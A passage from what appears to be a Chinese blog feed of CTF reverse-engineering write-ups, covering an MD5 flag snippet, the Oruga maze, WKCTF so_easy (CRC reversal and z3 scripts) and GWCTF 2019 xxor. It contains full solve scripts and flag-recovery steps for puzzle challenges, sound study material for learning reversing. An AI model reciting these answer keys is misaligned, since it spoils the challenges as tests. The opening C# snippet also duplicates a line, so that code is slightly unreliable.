stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 遍历哈希字节数组</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">byte</span> b <span class="keyword">in</span> hashBytes)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 将每个字节转换为两位的十六进制字符串，并将其追加到StringBuilder</span></span><br><span class="line">            stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">           <span class="comment">// &quot;X2&quot; 格式说明符表示使用大写字母，并且每个字节用两位数表示</span></span><br><span class="line">            stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 从 StringBuilder 中获取完整的十六进制哈希字符串</span></span><br><span class="line">        <span class="built_in">string</span> fullHashString = stringBuilder.ToString();</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 返回哈希字符串的前 20 个字符</span></span><br><span class="line">        <span class="keyword">return</span> fullHashString.Substring(<span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">       <span class="comment">// Substring(0, 20) 提取从索引 0 开始的前 20 个字符</span></span><br><span class="line">       <span class="comment">//第一个参数是从第几位开始，第二个参数是前多少个字符</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这串代码是输出MD5的前20个字符，并且全用大写字母表示，</p><p>而正常的MD5有32个字符，所以我们只需要截取前20个字符然后转换成大写就可以得出FLAG</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【BUU】Oruga 内心os：我觉得应该叫滑冰（</title>
      <link href="/2024/07/18/%E3%80%90BUU%E3%80%91Oruga/"/>
      <url>/2024/07/18/%E3%80%90BUU%E3%80%91Oruga/</url>
      
        <content type="html"><![CDATA[<h1 id="【BUU】Oruga"><a href="#【BUU】Oruga" class="headerlink" title="【BUU】Oruga"></a>【BUU】Oruga</h1><h2 id="内心-os：我觉得应该叫滑冰（"><a href="#内心-os：我觉得应该叫滑冰（" class="headerlink" title="内心 os：我觉得应该叫滑冰（"></a>内心 os：我觉得应该叫滑冰（</h2><p>拖进 ida 看 hex 下面有个地方像是地图</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/Oruga/map.png" alt="map"></p><p>main 函数进入后有个疑似是上下左右的部分</p><p>W：上 E：右 J：左 M 下</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/Oruga/%E4%B8%8A%E4%B8%8B%E5%B7%A6%E5%8F%B3.png" alt="上下左右"></p><p>把地图换成一种更明确的方式</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/Oruga/MZAE.png" alt="MZAE"></p><p>还是觉得匪夷所思，找了个 wp 看了一下，</p><p>发现是宝可梦冰面解密的那种迷宫，遇到障碍物之前是不会停下的</p><p>所输入的就是 flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【WKCTF】so_easy</title>
      <link href="/2024/07/17/%E3%80%90WKCTF%E3%80%91so_easy/"/>
      <url>/2024/07/17/%E3%80%90WKCTF%E3%80%91so_easy/</url>
      
        <content type="html"><![CDATA[<h1 id="【WKCTF】so-easy"><a href="#【WKCTF】so-easy" class="headerlink" title="【WKCTF】so_easy"></a><strong>【WKCTF】</strong>so_easy</h1><p>用压缩包打开apk，把里面的x86_64的 .so文件解压出来拖入ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/wkctf/so-easy/so_main.png.png" alt="so_main.png"></p><p>有两种方法，一个是z3爆破，一个是根据这个魔改CRC进行逆向</p><h2 id="CRC校验"><a href="#CRC校验" class="headerlink" title="CRC校验"></a>CRC校验</h2><p>先说正版做法CRC逆向</p><hr><p>【[CRC校验]手算与直观演示】 <a href="https://www.bilibili.com/video/BV1V4411Z7VA/?share_source=copy_web&vd_source=86d6e63e560e68bb720088caa831e036">https://www.bilibili.com/video/BV1V4411Z7VA/?share_source=copy_web&amp;vd_source=86d6e63e560e68bb720088caa831e036</a></p><p>【CRC原理】<a href="https://bbs.21ic.com/icview-2403118-1-2.html?_dsign=e20cd6df">https://bbs.21ic.com/icview-2403118-1-2.html?_dsign=e20cd6df</a></p><p>【上面 CRC原理 看不懂先看这个】<a href="https://blog.csdn.net/eydwyz/article/details/105705831?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172121223216800182199332%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172121223216800182199332&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-20-105705831-null-null.142">https://blog.csdn.net/eydwyz/article/details/105705831?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172121223216800182199332%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=172121223216800182199332&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-20-105705831-null-null.142</a></p><hr><p>找一个脚本CRC32的脚本，把相应的数据修改过来</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[] = &#123;<span class="number">-82</span>, <span class="number">-127</span>, <span class="number">-70</span>, <span class="number">-63</span>, <span class="number">-16</span>, <span class="number">-107</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">20</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">74</span>, <span class="number">-30</span>, <span class="number">82</span>, <span class="number">78</span>, <span class="number">-124</span>, <span class="number">-8</span>, <span class="number">-55</span>, <span class="number">62</span>, <span class="number">20</span>, <span class="number">-104</span>, <span class="number">-113</span>, <span class="number">-104</span>, <span class="number">-3</span>, <span class="number">9</span>, <span class="number">94</span>, <span class="number">-83</span>, <span class="number">5</span>,</span><br><span class="line"><span class="number">-76</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">-64</span>, <span class="number">63</span>&#125;;</span><br><span class="line">__int64 *ans = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">255</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (__int64 *)(s+i);</span><br><span class="line"><span class="keyword">if</span>(*ans &amp; <span class="number">1</span>)<span class="comment">//判断是否为奇数 ，因为CRC加密后的末位就是1，所以这里异或没问题</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)<span class="comment">//奇数小于0的情况</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//奇数大于0的情况，需要进行将补偿性异或，保证为负数（不知道为啥）</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans ^= <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//不是奇数的情况，因为CRC异或完应为奇数，所以偶数直接进行右移操作</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)<span class="comment">//偶数小于0的情况，需要进行将补偿性异或，保证为负数（不知道为啥）</span></span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans ^= <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//偶数大于0的情况</span></span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s[j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Z3爆破"><a href="#Z3爆破" class="headerlink" title="Z3爆破"></a>Z3爆破</h2><p>然后就是比较无脑的爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">final_flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x540A95F0C1BA81AE</span>, <span class="number">0xF8844E52E24A0314</span>, <span class="number">0x09FD988F98143EC9</span>, <span class="number">0x3FC00F01B405AD5E</span>]</span><br><span class="line"></span><br><span class="line">xor_value = BitVecVal(<span class="number">0x71234EA7D92996F5</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># 创建求解器</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否有解</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 如果有解，打印模型</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># 去除前缀 &#x27;0x&#x27;，得到纯十六进制字符串</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># 创建求解器</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否有解</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 如果有解，打印模型</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># 去除前缀 &#x27;0x&#x27;，得到纯十六进制字符串</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># 创建求解器</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否有解</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 如果有解，打印模型</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># 去除前缀 &#x27;0x&#x27;，得到纯十六进制字符串</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># 创建求解器</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否有解</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 如果有解，打印模型</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># 去除前缀 &#x27;0x&#x27;，得到纯十六进制字符串</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_flag)</span><br></pre></td></tr></table></figure><p>比较考验Z3约束器的使用</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【z3实践】【buu】[GWCTF 2019]xxor</title>
      <link href="/2024/07/16/%E3%80%90buu%E3%80%91%5BGWCTF%202019%5Dxxor/"/>
      <url>/2024/07/16/%E3%80%90buu%E3%80%91%5BGWCTF%202019%5Dxxor/</url>
      
        <content type="html"><![CDATA[<h1 id="【z3-实践】【buu】-GWCTF-2019-xxor"><a href="#【z3-实践】【buu】-GWCTF-2019-xxor" class="headerlink" title="【z3 实践】【buu】[GWCTF 2019]xxor"></a>【z3 实践】【buu】[GWCTF 2019]xxor</h1><p>拖进 ida 中</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/%5BGWCTF%202019%5Dxxor01.jpg" alt="[GWCTF 2019]xxor01"></p><p>跟进 main</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/main.png" alt="main"></p><p>发现是输入的字符串经过一个 魔改 tea 加密与检查函数</p><p>跟进魔改 tea，发现只是将 delta 和异或部分多加了点东西</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/tea.png" alt="tea"></p><p>跟进 sub_400700</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/sub400700.png" alt="sub400700"></p><p>感觉要爆破</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/v6%E5%B1%9E%E6%80%A7.jpg" alt="v6属性"></p><p>因为 v6 是 int64，所以要设置成 64 位</p><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    enc[i] = BitVec(<span class="string">&#x27;enc[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(enc[<span class="number">2</span>] - enc[<span class="number">3</span>] == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(enc[<span class="number">3</span>] + enc[<span class="number">4</span>] == <span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(enc[<span class="number">2</span>] - enc[<span class="number">4</span>] == <span class="number">0x42D731A8</span>)</span><br><span class="line">s.add(enc[<span class="number">0</span>] == <span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(enc[<span class="number">5</span>] == <span class="number">0x84F30420</span>)</span><br><span class="line">s.add(enc[<span class="number">1</span>] == <span class="number">0x20CAACF4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 如果有解，打印模型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6666&quot;</span>)</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;enc[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;] =&quot;</span>, <span class="built_in">hex</span>(m[enc[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(<span class="number">0x458BCD42</span> * <span class="number">64</span>))<span class="comment">#这是sum加密后的值</span></span><br></pre></td></tr></table></figure><p>爆破完得到密文</p><p>进行解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 